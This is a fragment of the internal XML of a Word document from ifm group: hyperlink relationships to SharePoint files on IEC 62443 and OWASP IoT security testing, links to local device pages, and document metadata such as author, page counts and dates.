Id="rId16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16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5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2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64" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://192.168.0.2/safecom/f_address" TargetMode="External"/><Relationship Id="rId11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25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171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227" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ifmworld-my.sharepoint.com/personal/nathalie_nuber_ifm_com/_layouts/15/Doc.aspx?sourcedoc=%7BC6953703-4356-453C-A613-225C319CAC5D%7D&amp;file=Security_Testing_Framework_Kali_EN.docx&amp;action=default&amp;mobileredirect=true" TargetMode="External"/><Relationship Id="rId269" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ifmworld-my.sharepoint.com/personal/nathalie_nuber_ifm_com/Documents/Microsoft%20Copilot%20Chat%20Files/IEC62443_4_2_source.txt" TargetMode="External"/><Relationship Id="rId33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129" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ifmworld-my.sharepoint.com/personal/nathalie_nuber_ifm_com/Documents/Microsoft%20Copilot%20Chat%20Files/OWASP%20IoT%20Security%20Testing%20Guide.pdf" TargetMode="External"/><Relationship Id="rId280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336" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://192.168.0.2/firmware/version" TargetMode="External"/><Relationship Id="rId75" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://192.168.0.2/devicestatus/errorlog/loglist" TargetMode="External"/><Relationship Id="rId14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82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6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/footnotes" Target="footnotes.xml"/><Relationship Id="rId238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9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0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47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44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8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51" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ifmworld-my.sharepoint.com/personal/nathalie_nuber_ifm_com/Documents/Microsoft%20Copilot%20Chat%20Files/OWASP%20Firmware%20Security%20Testing.md" TargetMode="External"/><Relationship Id="rId193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207" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://192.168.0.2/firmware/version" TargetMode="External"/><Relationship Id="rId249" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ifmworld-my.sharepoint.com/personal/nathalie_nuber_ifm_com/Documents/Microsoft%20Copilot%20Chat%20Files/100_SRIO_Product-Requirements%20_%2010_Requirements%20_%20Documents%20%26%20Pages%20_%20Safe_RemoteIO.pdf" TargetMode="External"/><Relationship Id="rId13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09" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ifmworld-my.sharepoint.com/personal/nathalie_nuber_ifm_com/Documents/Microsoft%20Copilot%20Chat%20Files/OWASP%20Firmware%20Security%20Testing.md" TargetMode="External"/><Relationship Id="rId260" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://127.0.0.1:26000/" TargetMode="External"/><Relationship Id="rId316" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://192.168.0.2/devicestatus/errorlog/loglist" TargetMode="External"/><Relationship Id="rId5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97" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ifmworld-my.sharepoint.com/personal/nathalie_nuber_ifm_com/Documents/Microsoft%20Copilot%20Chat%20Files/Testumgebung%20Security.md" TargetMode="External"/><Relationship Id="rId12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5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16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18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71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2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66" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://192.168.0.2/deviceinfo/" TargetMode="External"/><Relationship Id="rId13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27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173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29" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://192.168.0.2/devicestatus/errorlog/loglist" TargetMode="External"/><Relationship Id="rId240" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ifmworld-my.sharepoint.com/personal/nathalie_nuber_ifm_com/Documents/Microsoft%20Copilot%20Chat%20Files/IEC62443_4_2_source.txt" TargetMode="External"/><Relationship Id="rId35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77" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://192.168.0.2/devicestatus/errorlog/loglist" TargetMode="External"/><Relationship Id="rId100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82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38" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ifmworld-my.sharepoint.com/personal/nathalie_nuber_ifm_com/Documents/Microsoft%20Copilot%20Chat%20Files/IEC62443_4_2_source.txt" TargetMode="External"/><Relationship Id="rId8" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ifmworld-my.sharepoint.com/personal/nathalie_nuber_ifm_com/Documents/Microsoft%20Copilot%20Chat%20Files/IEC62443_4_2_source.txt" TargetMode="External"/><Relationship Id="rId142" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ifmworld-my.sharepoint.com/personal/nathalie_nuber_ifm_com/Documents/Microsoft%20Copilot%20Chat%20Files/OWASP%20Firmware%20Security%20Testing.md" TargetMode="External"/><Relationship Id="rId184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51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46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293" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ifmworld-my.sharepoint.com/personal/nathalie_nuber_ifm_com/Documents/Microsoft%20Copilot%20Chat%20Files/Market_Access_and_Compliance_Innovation_for_Aibased_Functional_Safety_Systems.pdf" TargetMode="External"/><Relationship Id="rId307" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ifmworld-my.sharepoint.com/personal/nathalie_nuber_ifm_com/Documents/Microsoft%20Copilot%20Chat%20Files/209_SRIO_CompSpec_Module_Com%20_%2020_System%20_%20Documents%20%26%20Pages%20_%20Safe_RemoteIO.pdf" TargetMode="External"/><Relationship Id="rId349" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ifmworld-my.sharepoint.com/personal/nathalie_nuber_ifm_com/Documents/Microsoft%20Copilot%20Chat%20Files/Testumgebung%20Security.md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DC91F-E3CA-4857-94FE-906E5A12D52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97c528e-e8db-4a71-b5cb-4edd5b40a06c}" enabled="1" method="Standard" siteId="{2782ef14-4849-46b4-b90d-d7e83fc425c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109</Pages>
  <Words>43063</Words>
  <Characters>270868</Characters>
  <Application>Microsoft Office Word</Application>
  <DocSecurity>0</DocSecurity>
  <Lines>9340</Lines>
  <Paragraphs>4616</Paragraphs>
  <ScaleCrop>false</ScaleCrop>
  <Company>ifm group</Company>
  <LinksUpToDate>false</LinksUpToDate>
  <CharactersWithSpaces>309315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Nuber, Nathalie</dc:creator>
  <cp:keywords/>
  <dc:description/>
  <cp:lastModifiedBy>Nuber, Nathalie</cp:lastModifiedBy>
  <cp:revision>55</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2026-08-27T05:08:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-08-27T11:26:00Z</dcterms:modified>
</cp:coreProperties>
</file>